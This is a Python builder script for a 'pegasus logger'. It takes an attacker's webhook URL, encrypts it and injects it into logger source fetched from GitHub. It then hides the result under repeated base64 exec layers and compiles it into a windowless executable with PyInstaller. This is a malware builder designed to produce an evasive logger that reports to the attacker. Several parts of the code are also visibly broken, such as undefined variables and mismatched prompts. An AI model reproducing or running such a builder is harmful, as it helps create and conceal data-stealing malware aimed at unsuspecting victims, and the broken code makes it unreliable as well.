import base64
from fileinput import filename
import os
import shutil
import time

import requests
from alive_progress import alive_bar
from colorama import Fore, Style, init
from cryptography.fernet import Fernet


def main(level, filename):
    print(
        Fore.BLUE
        + """
__________
\______   \ ____   _________    ________ __  ______
 |     ___// __ \ / ___\__  \  /  ___/  |  \/  ___/
 |    |   \  ___// /_/  > __ \_\___ \|  |  /\___ \
 |____|    \___  >___  (____  /____  >____//____  >
               \/_____/     \/     \/           \/

            Builder for pegasus logger
           github.com/addi00000/pegasus"""
        + Style.RESET_ALL
    )

    webhook = input(f"{Fore.CYAN}Webhook URL: {Style.RESET_ALL}")
    key = Fernet.generate_key()
    token = Fernet(key).encrypt(bytes(webhook, "utf-8"))
    line_to_inject = f"Fernet({key}).decrypt({token}).decode()"

    try:
        resp = requests.get(webhook)
        if not resp.ok:
            print(f"{Fore.RED}Invalid webhook URL{Style.RESET_ALL}")
            exit()
    except Exception:  # TODO: Clarify exceptions and a couple more
        print(f"{Fore.RED}Invalid webhook URL{Style.RESET_ALL}")
        exit()

    filename = input(f"{Fore.CYAN}Filename: {Style.RESET_ALL}")

    raw = requests.get(
        "https://raw.githubusercontent.com/addi00000/pegasus/main/pegasus.py"
    ).text

    print(
        f"{Fore.YELLOW}Creating {filename}.py with '{webhook}' as webhook...{Style.RESET_ALL}"
    )

    with open(f"{filename}.py", "w", encoding="utf-8") as f:
        f.write(raw.replace('"&WEBHOOK_URL&"', line_to_inject))

    print(f"{Fore.GREEN}Done!{Style.RESET_ALL}")

    level = get_level()
    Obfuscate()

    compile = input(f"{Fore.CYAN}Obfuscation level (1-30): {Style.RESET_ALL}").lower()

    if compile != "y":
        print("I think you said no. Please re-run the script if you said 'yes'")
        return

    print(f"{Fore.YELLOW}Beginning compilation...{Style.RESET_ALL}")
    # Install requirements
    os.system(r"pip install --upgrade -r .\requirements.txt")

    # Build the executable
    os.system(
        f"python -m PyInstaller --onefile --noconsole -i NONE --distpath ./ .\{filename}-obfuscated.py"
    )

    shutil.rmtree(r".\build")
    shutil.rmtree(r".\__pycache__")
    os.remove(f".\{filename}-obfuscated.spec")

    input(Fore.GREEN + "Done!\nPress enter to exit..." + Style.RESET_ALL)


def get_level():
    while True:
        raw = input(Fore.CYAN + "Obfuscation level (1-30): " + Style.RESET_ALL)
        num = str_to_int(num)

        if isinstance(num, int):
            return num
        print("Level is not a number!\nTry again")


def str_to_int(num: str) -> int:
    try:
        return int(num)
    except ValueError:
        return num


class Obfuscate:
    def __init__(self):
        self.file = f"{filename}.py"
        self.level = level

        self.clean()
        time.sleep(0.5)
        self.save(
            self.obfuscate(self.code(self.file), self.level),
            self.file,
            self.seperate_imports(self.file),
        )

    def code(self, file):
        with open(file, "r", encoding="utf-8") as f:
            code = f.read()

        return code

    def seperate_imports(self, file):
        imports = []

        with open(file, "r", encoding="utf-8") as f:
            lines = [line.rstrip() for line in f]

            imports.extend(
                line
                for line in lines
                if line.startswith("import") or line.startswith("from")
            )
        return imports

    def obfuscate(self, code, level):
        obfuscated = f"\nexec(base64.a85decode({base64.a85encode(code.encode('utf-8',errors = 'strict'))}))"

        with alive_bar(level) as bar:
            for _ in range(level):
                obfuscated = f"import base64\nexec(base64.a85decode({base64.a85encode(obfuscated.encode('utf-8',errors = 'strict'))}))"
                bar()

        return obfuscated

    def save(self, obfuscated, file, imports=None):
        with open(f"{file.replace('.py', '')}-obfuscated.py", "a", encoding="utf-8") as f:
            for module in imports:
                f.write(module + "\n")

            f.write(obfuscated)

    def clean(self):
        if os.path.exists(f"{self.file.replace('.py', '')}-obfuscated.py"):
            os.remove(f"{self.file.replace('.py', '')}-obfuscated.py")


if __name__ == "__main__":
    init()
    main()
